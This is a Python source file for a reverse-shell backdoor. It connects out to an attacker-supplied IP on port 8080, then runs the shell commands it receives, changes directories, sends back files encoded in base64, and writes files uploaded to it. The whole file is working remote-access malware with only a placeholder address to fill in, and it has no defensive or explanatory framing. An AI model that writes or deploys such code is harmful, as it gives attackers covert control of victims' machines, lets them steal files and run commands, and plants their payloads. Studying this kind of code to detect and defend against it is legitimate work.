import socket
import subprocess
import simplejson
import os
import base64


class backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def send_json(self, command_output):
		json_data = simplejson.dumps(command_output)
		self.connection.send(json_data.encode("utf-8"))

	def recieve_json(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024).decode()
				return simplejson.loads(json_data)
			except ValueError:
				continue

	def run_cd_command(self, directory):
		os.chdir(directory)
		return "Directory Changed to " + directory

	def read_file_contents(self, path):
		with open(path,"rb") as my_file:
			return base64.b64encode(my_file.read())

	def save_file(self, path, content):
		with open(path, "wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "Upload Completed"

	def run_command(self, recieved_command):
		return subprocess.check_output(recieved_command, shell=True)

	def get_directory_from_list(self, recieved_command):
		directory = ""
		for index in recieved_command:
			if not index == recieved_command[0]:
				directory = directory + index + " "
		return directory

	def start_door(self):
		#connection.send("Connected to connection\n")
		while True:
			recieved_command = self.recieve_json()
			try:
				if recieved_command[0] == "quit":
					self.connection.close()
					exit()

				elif recieved_command[0] == "cd" and len(recieved_command) > 1:
					if not recieved_command[1] == "..":
						directory = self.get_directory_from_list(recieved_command)
						command_output = self.run_cd_command(directory)
					else:
						command_output = self.run_cd_command(recieved_command[1])

				elif recieved_command[0] == "download":
						directory = self.get_directory_from_list(recieved_command)
						command_output = self.read_file_contents(directory)

				elif recieved_command[0] == "upload":
						command_output = self.save_file(recieved_command[1], recieved_command[2])
				else:
					command_output = self.run_command(recieved_command)
				
			except Exception:
				command_output = "An Error Occurred"
			self.send_json(command_output)

		self.connection.close()

process_backdoor = backdoor("your computer ip",8080)
process_backdoor.start_door()
